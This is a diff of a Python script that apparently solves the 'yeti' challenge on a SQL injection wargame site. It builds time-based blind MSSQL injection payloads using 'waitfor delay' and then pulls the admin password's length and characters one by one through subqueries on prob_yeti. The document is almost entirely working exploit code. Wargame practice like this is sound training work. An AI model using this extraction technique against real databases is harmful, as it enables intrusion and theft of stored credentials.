@@ -10,7 +10,7 @@ headers = {
 }
 
 def is_true(query):
-    url = "https://los.rubiya.kr/chall/yeti_e6afc70b892148ced2d1e063c1230255.php?pw=' if id='admin' and {0} waitfor delay '00:00:01' else waitfor delay '00:00:00'-- -".format(query)
+    url = "https://los.rubiya.kr/chall/yeti_e6afc70b892148ced2d1e063c1230255.php?pw=' if ({0}) waitfor delay '00:00:01' else waitfor delay '00:00:00'-- -".format(query)
     before = time.time()
     r = requests.get(url, headers=headers)
     after = time.time()
@@ -22,7 +22,7 @@ def is_true(query):
 def get_pw_length():
     i = 1
     while True:
-        query = "length(pw)={0}".format(i)
+        query = "len((select pw from prob_yeti where id='admin'))={0}".format(i)
         if is_true(query):
             return i
         i += 1
@@ -30,7 +30,7 @@ def get_pw_length():
 
 def get_char(location):
     for c in string.printable:
-        query = "substring(pw,{0},1)='{1}'".format(location, c)
+        query = "substring((select pw from prob_yeti where id='admin'),{0},1)='{1}'".format(location, c)
         if is_true(query):
             return c
 
